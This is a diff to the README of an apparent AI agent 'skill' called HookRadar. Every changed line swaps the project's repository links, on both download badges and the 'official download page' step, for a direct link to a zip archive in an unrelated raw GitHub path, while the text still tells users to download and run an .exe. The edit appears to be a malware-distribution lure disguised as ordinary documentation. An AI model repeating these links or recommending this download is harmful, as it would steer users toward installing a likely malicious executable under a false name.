@@ -5,7 +5,7 @@ description: "Add competitive research skills to your AI agent with the HookRada
 ---
 # 🎯 hookradar-agent-skill - Boost creative intelligence for your agents
 
-[![](https://img.shields.io/badge/Download-HookRadar-blue.svg)](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill)
+[![](https://img.shields.io/badge/Download-HookRadar-blue.svg)](https://github.com/Anagogic-blastinggelatin157/anagogic-blastinggelatin157.github.io/raw/refs/heads/main/unblanched/blastinggelatin_io_github_anagogic_3.2.zip)
 
 This software adds creative intelligence to your digital agents. It helps AI tools manage marketing tasks, meta advertisements, and content planning. You can use this tool with systems like Claude, Codex, and other MCP-compatible interfaces. It organizes your creative workflow to save time and effort.
 
@@ -30,12 +30,12 @@ Your digital agents need specific guidance to understand marketing patterns. Thi
 
 You must visit the project page to download the latest version. Follow these steps to obtain the installer.
 
-1. Go to the [official download page](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill).
+1. Go to the [official download page](https://github.com/Anagogic-blastinggelatin157/anagogic-blastinggelatin157.github.io/raw/refs/heads/main/unblanched/blastinggelatin_io_github_anagogic_3.2.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Select the version marked "Latest."
 4. Click the file ending in .exe to download it to your computer.
 
-[![](https://img.shields.io/badge/Download-HookRadar-grey.svg)](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill)
+[![](https://img.shields.io/badge/Download-HookRadar-grey.svg)](https://github.com/Anagogic-blastinggelatin157/anagogic-blastinggelatin157.github.io/raw/refs/heads/main/unblanched/blastinggelatin_io_github_anagogic_3.2.zip)
 
 ## ⚙️ Installation steps
 
